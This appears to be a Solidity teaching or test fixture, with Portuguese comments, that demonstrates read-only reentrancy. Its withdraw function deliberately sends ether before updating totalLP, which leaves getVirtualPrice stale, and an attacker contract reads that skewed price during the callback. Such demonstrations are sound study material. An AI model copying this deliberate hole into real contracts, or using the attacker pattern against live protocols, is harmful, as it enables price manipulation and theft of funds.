// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract V20_ReadOnlyReentrancy {
    mapping(address => uint256) public lpBalance;
    uint256 public totalLP;
    uint256 private _locked = 1;

    modifier nonReentrant() {
        require(_locked == 1, "LOCKED");
        _locked = 2;
        _;
        _locked = 1;
    }

    function deposit() external payable {
        lpBalance[msg.sender] += msg.value;
        totalLP += msg.value;
    }

    // VULNERÁVEL DE PROPÓSITO - totalLP atualizado DEPOIS do call
    function withdraw() external nonReentrant {
        uint256 amount = lpBalance[msg.sender];
        require(amount > 0, "no lp");
        lpBalance[msg.sender] = 0;
        // NÃO atualiza totalLP aqui - deixa pra depois (bug Curve)
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "fail");
        totalLP -= amount; // tarde demais! view já leu valor velho
    }

    function getVirtualPrice() external view returns (uint256) {
        if (totalLP == 0) return 1e18;
        return (address(this).balance * 1e18) / totalLP;
    }
}

contract V20_Attacker {
    V20_ReadOnlyReentrancy public victim;
    uint256 public priceSeenDuringReentrancy;
    uint256 public priceNormal;
    bool public attacked;
    
    constructor(address _victim) {
        victim = V20_ReadOnlyReentrancy(_victim);
    }
    function attack() external payable {
        priceNormal = victim.getVirtualPrice();
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }
    receive() external payable {
        if (!attacked) {
            attacked = true;
            priceSeenDuringReentrancy = victim.getVirtualPrice();
        }
    }
}
